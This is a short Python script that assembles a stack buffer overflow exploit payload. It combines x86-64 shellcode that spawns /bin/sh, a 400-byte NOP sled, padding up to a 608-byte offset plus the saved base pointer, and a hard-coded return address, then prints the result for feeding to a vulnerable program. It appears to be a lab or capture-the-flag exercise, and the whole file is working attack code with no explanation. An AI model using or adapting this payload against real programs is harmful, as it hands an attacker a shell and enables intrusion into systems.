import struct

buf =  b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

offset = 608
buff_len = len(buf)
payload_len = offset + 8 # for base pointer
nops = b'\x90'*400
nops_len = len(nops)

ret = struct.pack('<Q', 0x7fffffffe400)

junk = b"A"*(payload_len - nops_len - buff_len)

payload = nops + buf + junk + ret
print(payload)
